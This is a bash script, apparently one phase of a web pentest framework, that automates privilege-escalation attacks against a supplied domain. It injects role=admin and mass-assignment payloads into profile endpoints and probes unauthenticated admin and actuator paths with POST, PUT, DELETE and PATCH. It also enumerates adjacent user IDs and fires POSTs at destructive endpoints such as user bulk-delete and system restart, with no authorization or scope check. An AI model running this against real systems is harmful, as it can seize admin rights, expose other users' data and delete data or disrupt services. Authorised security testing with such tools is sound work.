#!/usr/bin/env bash
# priv_esc_phase.sh - Privilege escalation test harness, role manipulation,
# horizontal/vertical escalation.

priv_esc_phase() {
    local domain="$1"
    if [[ -z "$domain" ]]; then
        log "ERROR" "priv_esc_phase: No domain provided"
        return 1
    fi

    source "$(dirname "$0")/../core/core.sh" 2>/dev/null || true

    local output_dir="$OUTPUT_DIR/$domain/recon_$TIMESTAMP"
    mkdir -p "$output_dir/priv_esc"

    local results=0
    local vulns_file="$output_dir/priv_esc/privesc_vulns.txt"
    local paths_file="$output_dir/priv_esc/escalation_paths.txt"

    log "INFO" "Starting privilege escalation testing for $domain"

    tool_available curl || { log "WARN" "curl not found - skipping"; return 0; }

    # Role/privilege related parameters
    local role_params=(
        "role"
        "admin"
        "is_admin"
        "is_superuser"
        "user_type"
        "account_type"
        "permission"
        "privilege"
        "level"
        "group"
        "access_level"
    )

    # Admin-only endpoints to test
    local admin_endpoints=(
        "/api/admin"
        "/api/admin/users"
        "/api/admin/settings"
        "/api/admin/config"
        "/api/admin/logs"
        "/api/admin/backup"
        "/api/admin/audit"
        "/api/internal"
        "/api/internal/users"
        "/api/system"
        "/api/system/config"
        "/dashboard/admin"
        "/admin"
        "/admin/dashboard"
        "/management"
        "/management/api"
        "/debug"
        "/debug/vars"
        "/actuator"
        "/actuator/env"
        "/swagger-ui.html"
        "/api-docs"
    )

    # Test for role parameter manipulation
    log "INFO" "Testing role parameter manipulation"
    local role_endpoints=("/api/me" "/api/profile" "/api/user/update" "/api/account")

    for ep in "${role_endpoints[@]}"; do
        local url="https://${domain}${ep}"

        # Try adding role parameter
        for param in "${role_params[@]}"; do
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST \
                -d "${param}=admin" "$url" 2>/dev/null || echo "000")
            if [[ "$status" == "200" || "$status" == "201" ]]; then
                echo "[ROLE-INJECT] $ep - Accepts ${param}=admin parameter (HTTP $status)" >> "$vulns_file"
                ((results++)) || true
            fi

            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X PUT \
                -d "{\"${param}\":\"admin\"}" -H "Content-Type: application/json" "$url" 2>/dev/null || echo "000")
            if [[ "$status" == "200" || "$status" == "201" ]]; then
                echo "[ROLE-INJECT-JSON] $ep - Accepts ${param} in JSON body (HTTP $status)" >> "$vulns_file"
                ((results++)) || true
            fi
        done
    done

    # Test admin endpoint access without auth
    log "INFO" "Testing admin endpoint access"
    for ep in "${admin_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")

        if [[ "$status" == "200" ]]; then
            echo "[ADMIN-EXPOSED] $url - Admin endpoint accessible (HTTP 200)" >> "$vulns_file"
            ((results++)) || true

            # Test with different HTTP methods
            for method in "POST" "PUT" "DELETE" "PATCH"; do
                local m_status
                m_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X "$method" "$url" 2>/dev/null || echo "000")
                if [[ "$m_status" == "200" || "$m_status" == "201" || "$m_status" == "204" ]]; then
                    echo "[ADMIN-METHOD] $method $url - Admin mutation allowed (HTTP $m_status)" >> "$vulns_file"
                    ((results++)) || true
                fi
            done
        fi
    done

    # Horizontal privilege escalation - test with adjacent user IDs
    log "INFO" "Testing horizontal privilege escalation"
    local user_endpoints=(
        "/api/users/{id}"
        "/api/user/{id}/profile"
        "/api/accounts/{id}"
        "/api/customers/{id}"
    )

    for ep in "${user_endpoints[@]}"; do
        # Start with ID 1 and try adjacent IDs
        for id in 1 2 3 100 101 1000; do
            local url="https://${domain}${ep/\{id\}/$id}"
            local status
            status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$url" 2>/dev/null || echo "000")

            if [[ "$status" == "200" ]]; then
                # Try to access adjacent user
                local adj_id=$((id + 1))
                local adj_url="https://${domain}${ep/\{id\}/$adj_id}"
                local adj_status
                adj_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$adj_url" 2>/dev/null || echo "000")

                if [[ "$adj_status" == "200" ]]; then
                    local body1
                    body1=$(curl -s -m 10 "$url" 2>/dev/null | head -c 200 || true)
                    local body2
                    body2=$(curl -s -m 10 "$adj_url" 2>/dev/null | head -c 200 || true)

                    if [[ "$body1" != "$body2" ]]; then
                        echo "[HORIZONTAL-PRIVESC] $ep - Both ID $id and $adj_id return different data" >> "$paths_file"
                        ((results++)) || true
                    fi
                fi
            fi
        done
    done

    # Test for mass assignment vulnerability
    log "INFO" "Testing mass assignment"
    local ma_endpoints=("/api/users/update" "/api/profile" "/api/account" "/api/user")

    for ep in "${ma_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local payload='{"name":"test","role":"admin","is_admin":true,"permissions":["all"],"admin":true}'
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X PUT \
            -H "Content-Type: application/json" -d "$payload" "$url" 2>/dev/null || echo "000")
        if [[ "$status" == "200" || "$status" == "201" ]]; then
            echo "[MASS-ASSIGNMENT] $ep - Accepts role/permission fields in update (HTTP $status)" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Test for function-level access control
    log "INFO" "Testing function-level access control"
    local func_endpoints=(
        "/api/users/delete"
        "/api/users/bulk-delete"
        "/api/users/export"
        "/api/data/export"
        "/api/reports/generate"
        "/api/system/restart"
        "/api/config/update"
        "/api/keys/generate"
        "/api/webhooks/create"
    )

    for ep in "${func_endpoints[@]}"; do
        local url="https://${domain}${ep}"
        local status
        status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 -X POST "$url" 2>/dev/null || echo "000")
        if [[ "$status" == "200" || "$status" == "201" || "$status" == "204" ]]; then
            echo "[FUNC-ACCESS] $ep - Destructive function accessible (HTTP $status)" >> "$vulns_file"
            ((results++)) || true
        fi
    done

    # Test for organization/tenant isolation bypass
    log "INFO" "Testing tenant isolation"
    local tenant_params=("org_id" "tenant_id" "organization" "company_id" "workspace_id")
    for param in "${tenant_params[@]}"; do
        local tenant_url="https://${domain}/api/me?${param}=1"
        local tenant_status
        tenant_status=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$tenant_url" 2>/dev/null || echo "000")
        if [[ "$tenant_status" == "200" ]]; then
            local tenant_url2="https://${domain}/api/me?${param}=2"
            local tenant_status2
            tenant_status2=$(curl -s -o /dev/null -w "%{http_code}" -m 10 "$tenant_url2" 2>/dev/null || echo "000")
            if [[ "$tenant_status2" == "200" ]]; then
                echo "[TENANT-BYPASS] /api/me accepts ${param} - cross-tenant access possible" >> "$vulns_file"
                ((results++)) || true
            fi
        fi
    done

    # Write count
    echo "$results" > "$output_dir/priv_esc/count.txt"

    if [[ -f "$(dirname "$0")/../core/phase_bridge.sh" ]]; then
        source "$(dirname "$0")/../core/phase_bridge.sh" 2>/dev/null || true
        while IFS= read -r line; do
            write_finding "priv_esc" "CRITICAL" "$line" 2>/dev/null || true
        done < "$vulns_file" 2>/dev/null || true
    fi

    py_log "INFO" "priv_esc_phase" "Completed for $domain" "results=$results" 2>/dev/null || true
    log "INFO" "Privilege escalation phase complete: $results findings for $domain"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    priv_esc_phase "$@"
fi
